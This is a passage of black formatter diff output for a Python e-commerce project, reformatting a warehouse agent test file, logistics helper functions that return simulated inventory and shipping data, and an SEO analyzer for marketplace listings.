+                    "Stakeholder satisfaction",
+                ]
+            )
 
         return base_metrics
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/decision_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/test_warehouse_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/test_warehouse_agent.py	2025-06-19 04:03:39.406510+00:00
@@ -8,11 +8,11 @@
 
 from fs_agt_clean.agents.logistics.warehouse_agent import (
     WarehouseAgent,
     WarehouseLocation,
     PickingTask,
-    WarehouseMetrics
+    WarehouseMetrics,
 )
 
 
 @pytest.fixture
 def warehouse_agent():
@@ -29,11 +29,11 @@
         aisle="1",
         shelf="01",
         bin="01",
         capacity=100,
         current_stock=50,
-        accessibility_score=0.8
+        accessibility_score=0.8,
     )
 
 
 class TestWarehouseAgent:
     """Test cases for WarehouseAgent."""
@@ -52,47 +52,46 @@
             location_id="A1-01-01",
             zone="A",
             aisle="1",
             shelf="01",
             bin="01",
-            capacity=100
-        )
-        
+            capacity=100,
+        )
+
         assert location.location_id == "A1-01-01"
         assert location.zone == "A"
         assert location.capacity == 100
         assert "A1-01-01" in warehouse_agent.warehouse_locations
 
     @pytest.mark.asyncio
     async def test_create_picking_task(self, warehouse_agent):
         """Test creating a picking task."""
-        items = [
-            {"sku": "TEST001", "quantity": 2},
-            {"sku": "TEST002", "quantity": 1}
-        ]
-        
+        items = [{"sku": "TEST001", "quantity": 2}, {"sku": "TEST002", "quantity": 1}]
+
         task = await warehouse_agent.create_picking_task(
-            order_id="ORDER123",
-            items=items,
-            priority="high"
-        )
-        
+            order_id="ORDER123", items=items, priority="high"
+        )
+
         assert task.order_id == "ORDER123"
         assert len(task.items) == 2
         assert task.priority == "high"
         assert task.status == "pending"
         assert str(task.task_id) in warehouse_agent.picking_tasks
 
     @pytest.mark.asyncio
     async def test_optimize_storage_layout(self, warehouse_agent):
         """Test storage layout optimization."""
         # Add some test locations
-        await warehouse_agent.add_warehouse_location("A1-01-01", "A", "1", "01", "01", 100)
-        await warehouse_agent.add_warehouse_location("B1-01-01", "B", "1", "01", "01", 100)
-        
+        await warehouse_agent.add_warehouse_location(
+            "A1-01-01", "A", "1", "01", "01", 100
+        )
+        await warehouse_agent.add_warehouse_location(
+            "B1-01-01", "B", "1", "01", "01", 100
+        )
+
         result = await warehouse_agent.optimize_storage_layout()
-        
+
         assert "recommendations" in result
         assert "current_efficiency" in result
         assert "potential_improvement" in result
         assert "timestamp" in result
 
@@ -100,24 +99,26 @@
     async def test_optimize_picking_route(self, warehouse_agent):
         """Test picking route optimization."""
         # Create a picking task first
         items = [{"sku": "TEST001", "quantity": 1}]
         task = await warehouse_agent.create_picking_task("ORDER123", items)
-        
+
         # Add a location for the item
-        await warehouse_agent.add_warehouse_location("A1-01-01", "A", "1", "01", "01", 100)
-        
+        await warehouse_agent.add_warehouse_location(
+            "A1-01-01", "A", "1", "01", "01", 100
+        )
+
         result = await warehouse_agent.optimize_picking_route(str(task.task_id))
-        
+
         assert "task_id" in result
         assert "optimized_route" in result
         assert "estimated_time" in result
 
     def test_get_status(self, warehouse_agent):
         """Test getting agent status."""
         status = warehouse_agent.get_status()
-        
+
         assert status["agent_id"] == "test_warehouse_agent"
         assert status["agent_type"] == "WarehouseAgent"
         assert "total_locations" in status
         assert "utilization_rate" in status
         assert "status" in status
@@ -127,48 +128,48 @@
         """Test message processing."""
         message = {
             "type": "create_picking_task",
             "order_id": "ORDER123",
             "items": [{"sku": "TEST001", "quantity": 1}],
-            "priority": "normal"
+            "priority": "normal",
         }
-        
+
         await warehouse_agent.process_message(message)
-        
+
         # Check that task was created
-        tasks = [task for task in warehouse_agent.picking_tasks.values() 
-                if task.order_id == "ORDER123"]
+        tasks = [
+            task
+            for task in warehouse_agent.picking_tasks.values()
+            if task.order_id == "ORDER123"
+        ]
         assert len(tasks) == 1
 
     @pytest.mark.asyncio
     async def test_take_action(self, warehouse_agent):
         """Test taking actions."""
-        action = {
-            "type": "optimize_storage",
-            "parameters": {}
-        }
-        
+        action = {"type": "optimize_storage", "parameters": {}}
+
         # Should not raise an exception
         await warehouse_agent.take_action(action)
 
     def test_metrics_update(self, warehouse_agent):
         """Test metrics updating."""
         initial_total = warehouse_agent.metrics.total_locations
-        
+
         # Add a location
         location = WarehouseLocation(
             location_id="TEST001",
             zone="A",
             aisle="1",
             shelf="01",
             bin="01",
             capacity=100,
-            current_stock=50
+            current_stock=50,
         )
         warehouse_agent.warehouse_locations["TEST001"] = location
         warehouse_agent._update_metrics()
-        
+
         assert warehouse_agent.metrics.total_locations == initial_total + 1
         assert warehouse_agent.metrics.occupied_locations == 1
         assert warehouse_agent.metrics.utilization_rate == 1.0
 
 
@@ -188,16 +189,12 @@
     """Test cases for PickingTask."""
 
     def test_picking_task_creation(self):
         """Test picking task creation."""
         items = [{"sku": "TEST001", "quantity": 2}]
-        task = PickingTask(
-            order_id="ORDER123",
-            items=items,
-            priority="high"
-        )
-        
+        task = PickingTask(order_id="ORDER123", items=items, priority="high")
+
         assert task.order_id == "ORDER123"
         assert len(task.items) == 1
         assert task.priority == "high"
         assert task.status == "pending"
         assert isinstance(task.created_at, datetime)
@@ -207,10 +204,10 @@
     """Test cases for WarehouseMetrics."""
 
     def test_warehouse_metrics_creation(self):
         """Test warehouse metrics creation."""
         metrics = WarehouseMetrics()
-        
+
         assert metrics.total_locations == 0
         assert metrics.occupied_locations == 0
         assert metrics.utilization_rate == 0.0
         assert metrics.avg_picking_time == 0.0
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/test_warehouse_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/logistics_helpers.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/logistics_helpers.py	2025-06-19 04:03:39.686117+00:00
@@ -21,15 +21,17 @@
     @staticmethod
     async def gather_inventory_data(request) -> Dict[str, Any]:
         """Gather inventory data for analysis."""
         try:
             return {
-                "current_stock": request.current_inventory or {"quantity": 100, "value": 5000},
+                "current_stock": request.current_inventory
+                or {"quantity": 100, "value": 5000},
                 "sales_velocity": {"daily_average": 5, "weekly_trend": "stable"},
-                "seasonal_patterns": request.seasonal_factors or {"peak_months": [11, 12], "low_months": [1, 2]},
+                "seasonal_patterns": request.seasonal_factors
+                or {"peak_months": [11, 12], "low_months": [1, 2]},
                 "supplier_lead_times": {"primary": 14, "backup": 21},
-                "cost_structure": {"unit_cost": 25.0, "holding_cost_rate": 0.15}
+                "cost_structure": {"unit_cost": 25.0, "holding_cost_rate": 0.15},
             }
         except Exception as e:
             logger.error(f"Error gathering inventory data: {e}")
             return {"current_stock": {"quantity": 50, "value": 2500}}
 
@@ -38,299 +40,342 @@
         """Perform AI-powered inventory analysis."""
         try:
             # Simulate AI analysis with realistic logistics intelligence
             current_stock = inventory_data.get("current_stock", {})
             sales_velocity = inventory_data.get("sales_velocity", {})
-            
+
             analysis = {
                 "demand_forecast": {
                     "next_30_days": sales_velocity.get("daily_average", 5) * 30,
                     "confidence": 0.85,
-                    "trend": sales_velocity.get("weekly_trend", "stable")
+                    "trend": sales_velocity.get("weekly_trend", "stable"),
                 },
                 "stock_optimization": {
                     "optimal_quantity": 150,
                     "reorder_point": 30,
                     "safety_stock": 20,
-                    "max_stock": 200
+                    "max_stock": 200,
                 },
                 "cost_analysis": {
                     "holding_cost_annual": 750.0,
                     "stockout_risk": 0.05,
-                    "optimization_potential": 0.15
+                    "optimization_potential": 0.15,
                 },
                 "ai_insights": [
                     "Demand pattern shows seasonal variation",
                     "Current stock levels are adequate for next 20 days",
-                    "Consider increasing safety stock for peak season"
-                ]
-            }
-            
+                    "Consider increasing safety stock for peak season",
+                ],
+            }
+
             return analysis
-            
+
         except Exception as e:
             logger.error(f"Error in AI inventory analysis: {e}")
             return {"demand_forecast": {"next_30_days": 100, "confidence": 0.6}}
 
     @staticmethod
     async def generate_inventory_recommendations(request, analysis) -> List[str]:
         """Generate inventory optimization recommendations."""
         try:
             recommendations = []
-            
+
             demand_forecast = analysis.get("demand_forecast", {})
             stock_optimization = analysis.get("stock_optimization", {})
-            
+
             if demand_forecast.get("trend") == "increasing":
-                recommendations.append("Increase inventory levels to meet growing demand")
-            
+                recommendations.append(
+                    "Increase inventory levels to meet growing demand"
+                )
+
             if stock_optimization.get("reorder_point", 0) > 0:
-                recommendations.append(f"Set reorder point at {stock_optimization['reorder_point']} units")
-            
-            recommendations.extend([
-                "Implement automated reorder system",
-                "Monitor seasonal demand patterns",
-                "Optimize supplier lead times",
-                "Consider demand forecasting improvements"
-            ])
-            
+                recommendations.append(
+                    f"Set reorder point at {stock_optimization['reorder_point']} units"
+                )
+
+            recommendations.extend(
+                [
+                    "Implement automated reorder system",
+                    "Monitor seasonal demand patterns",
+                    "Optimize supplier lead times",
+                    "Consider demand forecasting improvements",
+                ]
+            )
+
             return recommendations
-            
+
         except Exception as e:
             logger.error(f"Error generating inventory recommendations: {e}")
             return ["Review current inventory levels", "Implement basic reorder system"]
 
     @staticmethod
     async def calculate_inventory_forecast(request, analysis) -> Dict[str, Any]:
         """Calculate inventory forecast."""
         try:
             demand_forecast = analysis.get("demand_forecast", {})
-            
+
             return {
                 "forecast_horizon_days": request.forecast_horizon_days,
                 "predicted_demand": demand_forecast.get("next_30_days", 100),
                 "confidence_level": demand_forecast.get("confidence", 0.7),
                 "seasonal_adjustments": {"peak_factor": 1.5, "low_factor": 0.7},
                 "trend_analysis": demand_forecast.get("trend", "stable"),
-                "forecast_accuracy": 0.85
-            }
-            
+                "forecast_accuracy": 0.85,
+            }
+
         except Exception as e:
             logger.error(f"Error calculating inventory forecast: {e}")
             return {"predicted_demand": 100, "confidence_level": 0.6}
 
     @staticmethod
     async def assess_inventory_risks(request, analysis) -> Dict[str, Any]:
         """Assess inventory risks."""
         try:
             cost_analysis = analysis.get("cost_analysis", {})
-            
+
             return {
                 "stockout_risk": cost_analysis.get("stockout_risk", 0.1),
                 "overstock_risk": 0.05,
                 "obsolescence_risk": 0.02,
                 "supplier_risk": 0.08,
                 "demand_volatility": 0.15,
                 "mitigation_strategies": [
                     "Maintain safety stock levels",
                     "Diversify supplier base",
                     "Implement demand sensing",
-                    "Regular inventory reviews"
-                ]
-            }
-            
+                    "Regular inventory reviews",
+                ],
+            }
+
         except Exception as e:
             logger.error(f"Error assessing inventory risks: {e}")
-            return {"stockout_risk": 0.1, "mitigation_strategies": ["Monitor stock levels"]}
-
-    @staticmethod
-    async def calculate_inventory_cost_impact(request, recommendations) -> Dict[str, Any]:
+            return {
+                "stockout_risk": 0.1,
+                "mitigation_strategies": ["Monitor stock levels"],
+            }
+
+    @staticmethod
+    async def calculate_inventory_cost_impact(
+        request, recommendations
+    ) -> Dict[str, Any]:
         """Calculate cost impact of inventory optimization."""
         try:
             return {
                 "current_holding_cost": 750.0,
                 "optimized_holding_cost": 637.5,
                 "cost_savings": 112.5,
                 "savings_percentage": 0.15,
                 "implementation_cost": 200.0,
                 "payback_period_months": 2.1,
-                "annual_savings": 675.0
-            }
-            
+                "annual_savings": 675.0,
+            }
+
         except Exception as e:
             logger.error(f"Error calculating inventory cost impact: {e}")
             return {"cost_savings": 100.0, "savings_percentage": 0.1}
 
     @staticmethod
     async def predict_service_level(request, forecast) -> float:
         """Predict service level."""
         try:
             target_service_level = request.target_service_level
             forecast_accuracy = forecast.get("forecast_accuracy", 0.8)
-            
+
             # Calculate predicted service level based on forecast accuracy
-            predicted_service_level = min(target_service_level * forecast_accuracy, 0.99)
-            
+            predicted_service_level = min(
+                target_service_level * forecast_accuracy, 0.99
+            )
+
             return round(predicted_service_level, 3)
-            
+
         except Exception as e:
             logger.error(f"Error predicting service level: {e}")
             return 0.90
 
     @staticmethod
-    async def generate_reorder_suggestions(request, analysis, recommendations) -> List[Dict[str, Any]]:
+    async def generate_reorder_suggestions(
+        request, analysis, recommendations
+    ) -> List[Dict[str, Any]]:
         """Generate reorder suggestions."""
         try:
             stock_optimization = analysis.get("stock_optimization", {})
-            
+
             suggestions = [
                 {
                     "product_id": request.product_info.get("product_id", "PROD001"),
                     "current_quantity": 100,
                     "reorder_quantity": stock_optimization.get("optimal_quantity", 150),
                     "reorder_point": stock_optimization.get("reorder_point", 30),
                     "supplier": "Primary Supplier",
                     "lead_time_days": 14,
                     "urgency": "medium",
-                    "estimated_cost": 3750.0
+                    "estimated_cost": 3750.0,
                 }
             ]
-            
+
             return suggestions
-            
+
         except Exception as e:
             logger.error(f"Error generating reorder suggestions: {e}")
-            return [{"product_id": "PROD001", "reorder_quantity": 100, "urgency": "low"}]
-
-    @staticmethod
-    async def calculate_inventory_confidence(request, analysis, recommendations) -> float:
+            return [
+                {"product_id": "PROD001", "reorder_quantity": 100, "urgency": "low"}
+            ]
+
+    @staticmethod
+    async def calculate_inventory_confidence(
+        request, analysis, recommendations
+    ) -> float:
         """Calculate confidence score for inventory analysis."""
         try:
-            demand_confidence = analysis.get("demand_forecast", {}).get("confidence", 0.7)
+            demand_confidence = analysis.get("demand_forecast", {}).get(
+                "confidence", 0.7
+            )
             data_quality = 0.8 if request.sales_history else 0.6
             recommendation_count = len(recommendations)
-            
+
             # Weighted confidence calculation
-            confidence = (demand_confidence * 0.5 + data_quality * 0.3 + 
-                         min(recommendation_count / 5, 1.0) * 0.2)
-            
+            confidence = (
+                demand_confidence * 0.5
+                + data_quality * 0.3
+                + min(recommendation_count / 5, 1.0) * 0.2
+            )
+
             return round(confidence, 2)
-            
+
         except Exception as e:
             logger.error(f"Error calculating inventory confidence: {e}")
             return 0.7
 
     @staticmethod
     async def create_fallback_inventory_result(request):
         """Create fallback inventory result."""
-        from fs_agt_clean.agents.logistics.ai_logistics_agent import InventoryManagementResult
-        
+        from fs_agt_clean.agents.logistics.ai_logistics_agent import (
+            InventoryManagementResult,
+        )
+
         return InventoryManagementResult(
             operation_type=request.operation_type,
             analysis_timestamp=datetime.now(timezone.utc),
             inventory_forecast={"predicted_demand": 100, "confidence_level": 0.6},
-            optimization_recommendations=["Review inventory levels", "Implement reorder system"],
+            optimization_recommendations=[
+                "Review inventory levels",
+                "Implement reorder system",
+            ],
             reorder_suggestions=[{"product_id": "PROD001", "reorder_quantity": 100}],
             risk_assessment={"stockout_risk": 0.1},
             confidence_score=0.6,
             cost_impact={"cost_savings": 100.0},
-            service_level_prediction=0.90
+            service_level_prediction=0.90,
         )
 
     # Shipping Helper Methods
 
     @staticmethod
     async def gather_shipping_data(request) -> Dict[str, Any]:
         """Gather shipping data for optimization."""
         try:
             return {
                 "package_weight": request.package_details.get("weight", 2.5),
-                "package_dimensions": request.package_details.get("dimensions", {"length": 12, "width": 8, "height": 6}),
+                "package_dimensions": request.package_details.get(
+                    "dimensions", {"length": 12, "width": 8, "height": 6}
+                ),
                 "destination_zone": "Zone 3",
                 "carrier_rates": {
                     "ups": {"ground": 8.50, "air": 15.25},
                     "fedex": {"ground": 8.75, "express": 16.00},
-                    "usps": {"ground": 7.25, "priority": 12.50}
+                    "usps": {"ground": 7.25, "priority": 12.50},
                 },
                 "delivery_times": {
                     "ups": {"ground": "3-5 days", "air": "1-2 days"},
                     "fedex": {"ground": "3-5 days", "express": "1-2 days"},
-                    "usps": {"ground": "3-7 days", "priority": "2-3 days"}
-                }
-            }
-            
+                    "usps": {"ground": "3-7 days", "priority": "2-3 days"},
+                },
+            }
+
         except Exception as e:
             logger.error(f"Error gathering shipping data: {e}")
             return {"package_weight": 2.0, "carrier_rates": {"ups": {"ground": 8.00}}}
 
     @staticmethod
     async def perform_ai_shipping_analysis(request, shipping_data) -> Dict[str, Any]:
         """Perform AI-powered shipping analysis."""
         try:
             carrier_rates = shipping_data.get("carrier_rates", {})
             delivery_times = shipping_data.get("delivery_times", {})
-            
+
             analysis = {
                 "cost_analysis": {
                     "lowest_cost_option": "usps_ground",
                     "cost_range": {"min": 7.25, "max": 16.00},
-                    "cost_optimization_potential": 0.20
+                    "cost_optimization_potential": 0.20,
                 },
                 "time_analysis": {
                     "fastest_option": "ups_air",
                     "time_range": {"min": "1-2 days", "max": "3-7 days"},
-                    "time_optimization_potential": 0.60
+                    "time_optimization_potential": 0.60,
                 },
                 "carrier_performance": {
                     "ups": {"reliability": 0.95, "cost_efficiency": 0.80},
                     "fedex": {"reliability": 0.96, "cost_efficiency": 0.75},
-                    "usps": {"reliability": 0.90, "cost_efficiency": 0.90}
+                    "usps": {"reliability": 0.90, "cost_efficiency": 0.90},
                 },
                 "ai_recommendations": [
                     "USPS Ground offers best cost efficiency",
                     "UPS Air recommended for time-sensitive shipments",
-                    "Consider FedEx for high-value items"
-                ]
-            }
-            
+                    "Consider FedEx for high-value items",
+                ],
+            }
+
             return analysis
-            
+
         except Exception as e:
             logger.error(f"Error in AI shipping analysis: {e}")
-            return {"cost_analysis": {"lowest_cost_option": "standard", "cost_range": {"min": 8.00, "max": 15.00}}}
+            return {
+                "cost_analysis": {
+                    "lowest_cost_option": "standard",
+                    "cost_range": {"min": 8.00, "max": 15.00},
+                }
+            }
 
     @staticmethod
     async def calculate_shipping_options(request, analysis) -> List[Dict[str, Any]]:
         """Calculate available shipping options."""
         try:
             cost_analysis = analysis.get("cost_analysis", {})
             time_analysis = analysis.get("time_analysis", {})
-            
+
             options = [
                 {
                     "carrier": "ups",
                     "service": "ground",
                     "cost": 8.50,
                     "delivery_time": "3-5 days",
-                    "reliability": 0.95
+                    "reliability": 0.95,
                 },
                 {
                     "carrier": "fedex",
                     "service": "ground",
                     "cost": 8.75,
                     "delivery_time": "3-5 days",
-                    "reliability": 0.96
+                    "reliability": 0.96,
                 },
                 {
                     "carrier": "usps",
                     "service": "ground",
                     "cost": 7.25,
                     "delivery_time": "3-7 days",
-                    "reliability": 0.90
+                    "reliability": 0.90,
+                },
+            ]
+
+            return options
+
+        except Exception as e:
+            logger.error(f"Error calculating shipping options: {e}")
+            return [
+                {
+                    "carrier": "standard",
+                    "service": "ground",
+                    "cost": 8.00,
+                    "delivery_time": "3-5 days",
                 }
             ]
-            
-            return options
-            
-        except Exception as e:
-            logger.error(f"Error calculating shipping options: {e}")
-            return [{"carrier": "standard", "service": "ground", "cost": 8.00, "delivery_time": "3-5 days"}]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/logistics_helpers.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/seo_analyzer.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/seo_analyzer.py	2025-06-19 04:03:39.696845+00:00
@@ -71,34 +71,50 @@
         }
 
         # Marketplace-specific SEO rules
         self.marketplace_seo_rules = {
             "ebay": {
-                "title_keyword_positions": [0, 1, 2],  # First 3 words are most important
+                "title_keyword_positions": [
+                    0,
+                    1,
+                    2,
+                ],  # First 3 words are most important
                 "optimal_title_length": (60, 80),
                 "optimal_description_length": (200, 500),
                 "keyword_density_range": (0.01, 0.03),
-                "important_sections": ["title", "subtitle", "description", "item_specifics"],
+                "important_sections": [
+                    "title",
+                    "subtitle",
+                    "description",
+                    "item_specifics",
+                ],
             },
             "amazon": {
                 "title_keyword_positions": [0, 1],  # First 2 words are most important
                 "optimal_title_length": (150, 200),
                 "optimal_description_length": (300, 600),
                 "keyword_density_range": (0.005, 0.02),
-                "important_sections": ["title", "bullet_points", "description", "backend_keywords"],
+                "important_sections": [
+                    "title",
+                    "bullet_points",
+                    "description",
+                    "backend_keywords",
+                ],
             },
         }
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "keyword_research_service",
-            "competitor_analysis_enabled",
-            "search_volume_api",
-            "ranking_tracker_enabled",
-        ])
+        fields.extend(
+            [
+                "keyword_research_service",
+                "competitor_analysis_enabled",
+                "search_volume_api",
+                "ranking_tracker_enabled",
+            ]
+        )
         return fields
 
     async def _setup_content_resources(self) -> None:
         """Set up SEO analysis resources."""
         await self._load_keyword_database()
@@ -115,21 +131,33 @@
         # Simulate loading keyword data
         self.keyword_database = {
             "electronics": {
                 "primary": ["smartphone", "laptop", "tablet", "headphones", "camera"],
                 "secondary": ["wireless", "bluetooth", "HD", "portable", "premium"],
-                "long_tail": ["best smartphone 2024", "wireless bluetooth headphones", "4K camera"],
+                "long_tail": [
+                    "best smartphone 2024",
+                    "wireless bluetooth headphones",
+                    "4K camera",
+                ],
             },
             "clothing": {
                 "primary": ["shirt", "dress", "jeans", "jacket", "shoes"],
                 "secondary": ["cotton", "comfortable", "stylish", "trendy", "casual"],
-                "long_tail": ["comfortable cotton shirt", "stylish casual dress", "trendy denim jeans"],
+                "long_tail": [
+                    "comfortable cotton shirt",
+                    "stylish casual dress",
+                    "trendy denim jeans",
+                ],
             },
             "home": {
                 "primary": ["furniture", "decor", "kitchen", "bedroom", "living room"],
                 "secondary": ["modern", "wooden", "metal", "glass", "comfortable"],
-                "long_tail": ["modern wooden furniture", "kitchen decor items", "bedroom furniture set"],
+                "long_tail": [
+                    "modern wooden furniture",
+                    "kitchen decor items",
+                    "bedroom furniture set",
+                ],
             },
         }
 
     async def _initialize_seo_tools(self) -> None:
         """Initialize SEO analysis tools."""
@@ -168,11 +196,13 @@
         try:
             content = event.get("content", {})
             target_keywords = event.get("target_keywords", [])
             optimization_goals = event.get("goals", ["ranking", "visibility"])
 
-            result = await self.optimize_content_for_seo(content, target_keywords, optimization_goals)
+            result = await self.optimize_content_for_seo(
+                content, target_keywords, optimization_goals
+            )
             self.metrics["content_optimized"] += 1
             logger.info(f"Optimized content for SEO goals: {optimization_goals}")
 
         except Exception as e:
             logger.error(f"Error handling SEO optimization event: {e}")
@@ -196,11 +226,15 @@
                 result = await self.comprehensive_seo_analysis(content, keywords)
 
             end_time = datetime.now(timezone.utc)
             self.metrics["generation_latency"] = (end_time - start_time).total_seconds()
 
-            return {"analysis": result, "success": True, "analysis_time": self.metrics["generation_latency"]}
+            return {
+                "analysis": result,
+                "success": True,
+                "analysis_time": self.metrics["generation_latency"],
+            }
 
         except Exception as e:
             logger.error(f"Error generating SEO analysis: {e}")
             return {"error": str(e), "success": False}
 
@@ -210,14 +244,18 @@
             content = task.get("content", {})
             keywords = task.get("keywords", [])
             goals = task.get("optimization_goals", ["ranking"])
 
             start_time = datetime.now(timezone.utc)
-            optimized_content = await self.optimize_content_for_seo(content, keywords, goals)
+            optimized_content = await self.optimize_content_for_seo(
+                content, keywords, goals
+            )
             end_time = datetime.now(timezone.utc)
 
-            self.metrics["optimization_latency"] = (end_time - start_time).total_seconds()
+            self.metrics["optimization_latency"] = (
+                end_time - start_time
+            ).total_seconds()
 
             return {
                 "original_content": content,
                 "optimized_content": optimized_content,
                 "target_keywords": keywords,
@@ -228,26 +266,36 @@
 
         except Exception as e:
             logger.error(f"Error optimizing content for SEO: {e}")
             return {"error": str(e), "success": False}
 
-    async def comprehensive_seo_analysis(self, content: Dict[str, Any], keywords: List[str]) -> Dict[str, Any]:
+    async def comprehensive_seo_analysis(
+        self, content: Dict[str, Any], keywords: List[str]
+    ) -> Dict[str, Any]:
         """Perform comprehensive SEO analysis."""
         try:
             analysis_results = {}
 
             # Keyword analysis
-            analysis_results["keyword_analysis"] = await self.analyze_keyword_optimization(content, keywords)
+            analysis_results["keyword_analysis"] = (
+                await self.analyze_keyword_optimization(content, keywords)
+            )
 
             # Content structure analysis
-            analysis_results["structure_analysis"] = await self.analyze_content_structure(content)
+            analysis_results["structure_analysis"] = (
+                await self.analyze_content_structure(content)
+            )
 
             # Readability analysis
-            analysis_results["readability_analysis"] = await self._analyze_readability(content)
+            analysis_results["readability_analysis"] = await self._analyze_readability(
+                content
+            )
 
             # Marketplace-specific analysis
-            analysis_results["marketplace_analysis"] = await self._analyze_marketplace_compliance(content)
+            analysis_results["marketplace_analysis"] = (
+                await self._analyze_marketplace_compliance(content)
+            )
 
             # Overall SEO score calculation
             overall_score = self._calculate_overall_seo_score(analysis_results)
 
             # Generate recommendations
@@ -264,11 +312,13 @@
 
         except Exception as e:
             logger.error(f"Error in comprehensive SEO analysis: {e}")
             return {"error": str(e)}
 
-    async def analyze_keyword_optimization(self, content: Dict[str, Any], keywords: List[str]) -> Dict[str, Any]:
+    async def analyze_keyword_optimization(
+        self, content: Dict[str, Any], keywords: List[str]
+    ) -> Dict[str, Any]:
         """Analyze keyword optimization in content."""
         try:
             if not keywords:
                 return {"error": "No keywords provided for analysis"}
 
@@ -276,46 +326,66 @@
             all_text = self._extract_all_text(content)
 
             keyword_analysis = {}
 
             for keyword in keywords:
-                analysis = await self._analyze_single_keyword(all_text, keyword, content)
+                analysis = await self._analyze_single_keyword(
+                    all_text, keyword, content
+                )
                 keyword_analysis[keyword] = analysis
 
             # Calculate overall keyword optimization score
-            keyword_scores = [analysis["optimization_score"] for analysis in keyword_analysis.values()]
-            overall_keyword_score = sum(keyword_scores) / len(keyword_scores) if keyword_scores else 0
+            keyword_scores = [
+                analysis["optimization_score"] for analysis in keyword_analysis.values()
+            ]
+            overall_keyword_score = (
+                sum(keyword_scores) / len(keyword_scores) if keyword_scores else 0
+            )
 
             return {
                 "overall_keyword_score": overall_keyword_score,
                 "keyword_details": keyword_analysis,
-                "keyword_density_overall": self._calculate_overall_keyword_density(all_text, keywords),
-                "recommendations": self._generate_keyword_recommendations(keyword_analysis),
+                "keyword_density_overall": self._calculate_overall_keyword_density(
+                    all_text, keywords
+                ),
+                "recommendations": self._generate_keyword_recommendations(
+                    keyword_analysis
+                ),
             }
 
         except Exception as e:
             logger.error(f"Error analyzing keyword optimization: {e}")
             return {"error": str(e)}
 
-    async def analyze_content_structure(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def analyze_content_structure(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Analyze content structure for SEO."""
         try:
             structure_analysis = {
-                "title_analysis": self._analyze_title_structure(content.get("title", "")),
-                "description_analysis": self._analyze_description_structure(content.get("description", "")),
-                "bullet_points_analysis": self._analyze_bullet_points(content.get("bullet_points", [])),
+                "title_analysis": self._analyze_title_structure(
+                    content.get("title", "")
+                ),
+                "description_analysis": self._analyze_description_structure(
+                    content.get("description", "")
+                ),
+                "bullet_points_analysis": self._analyze_bullet_points(
+                    content.get("bullet_points", [])
+                ),
                 "content_hierarchy": self._analyze_content_hierarchy(content),
                 "meta_elements": self._analyze_meta_elements(content),
             }
 
             # Calculate structure score
             structure_score = self._calculate_structure_score(structure_analysis)
 
             return {
                 "structure_score": structure_score,
                 "structure_details": structure_analysis,
-                "recommendations": self._generate_structure_recommendations(structure_analysis),
+                "recommendations": self._generate_structure_recommendations(
+                    structure_analysis
+                ),
             }
 
         except Exception as e:
             logger.error(f"Error analyzing content structure: {e}")
             return {"error": str(e)}
@@ -327,31 +397,43 @@
         try:
             optimized_content = content.copy()
             optimizations_applied = []
 
             if "ranking" in goals:
-                optimized_content, ranking_opts = await self._optimize_for_ranking(optimized_content, keywords)
+                optimized_content, ranking_opts = await self._optimize_for_ranking(
+                    optimized_content, keywords
+                )
                 optimizations_applied.extend(ranking_opts)
 
             if "visibility" in goals:
-                optimized_content, visibility_opts = await self._optimize_for_visibility(optimized_content, keywords)
+                optimized_content, visibility_opts = (
+                    await self._optimize_for_visibility(optimized_content, keywords)
+                )
                 optimizations_applied.extend(visibility_opts)
 
             if "conversion" in goals:
-                optimized_content, conversion_opts = await self._optimize_for_conversion(optimized_content)
+                optimized_content, conversion_opts = (
+                    await self._optimize_for_conversion(optimized_content)
+                )
                 optimizations_applied.extend(conversion_opts)
 
             # Calculate improvement scores
             original_score = await self._calculate_content_seo_score(content, keywords)
-            optimized_score = await self._calculate_content_seo_score(optimized_content, keywords)
+            optimized_score = await self._calculate_content_seo_score(
+                optimized_content, keywords
+            )
 
             return {
                 "optimized_content": optimized_content,
                 "optimizations_applied": optimizations_applied,
                 "seo_score_before": original_score,
                 "seo_score_after": optimized_score,
-                "improvement_percentage": ((optimized_score - original_score) / original_score * 100) if original_score > 0 else 0,
+                "improvement_percentage": (
+                    ((optimized_score - original_score) / original_score * 100)
+                    if original_score > 0
+                    else 0
+                ),
                 "optimization_goals": goals,
             }
 
         except Exception as e:
             logger.error(f"Error optimizing content for SEO: {e}")
@@ -371,22 +453,26 @@
         if "meta_description" in content:
             text_parts.append(content["meta_description"])
 
         return " ".join(text_parts).lower()
 
-    async def _analyze_single_keyword(self, text: str, keyword: str, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _analyze_single_keyword(
+        self, text: str, keyword: str, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Analyze a single keyword in the content."""
         keyword_lower = keyword.lower()
 
         # Count occurrences
         total_words = len(text.split())
         keyword_count = text.count(keyword_lower)
         keyword_density = keyword_count / total_words if total_words > 0 else 0
 
         # Check keyword placement
         title_has_keyword = keyword_lower in content.get("title", "").lower()
-        description_has_keyword = keyword_lower in content.get("description", "").lower()
+        description_has_keyword = (
+            keyword_lower in content.get("description", "").lower()
+        )
 
         # Calculate optimization score
         optimization_score = 0
         if title_has_keyword:
             optimization_score += 40
@@ -403,50 +489,66 @@
             "density": keyword_density,
             "in_title": title_has_keyword,
             "in_description": description_has_keyword,
             "optimization_score": optimization_score,
             "recommendations": self._generate_keyword_specific_recommendations(
-                keyword, keyword_count, keyword_density, title_has_keyword, description_has_keyword
+                keyword,
+                keyword_count,
+                keyword_density,
+                title_has_keyword,
+                description_has_keyword,
             ),
         }
 
-    def _calculate_overall_keyword_density(self, text: str, keywords: List[str]) -> float:
+    def _calculate_overall_keyword_density(
+        self, text: str, keywords: List[str]
+    ) -> float:
         """Calculate overall keyword density."""
         total_words = len(text.split())
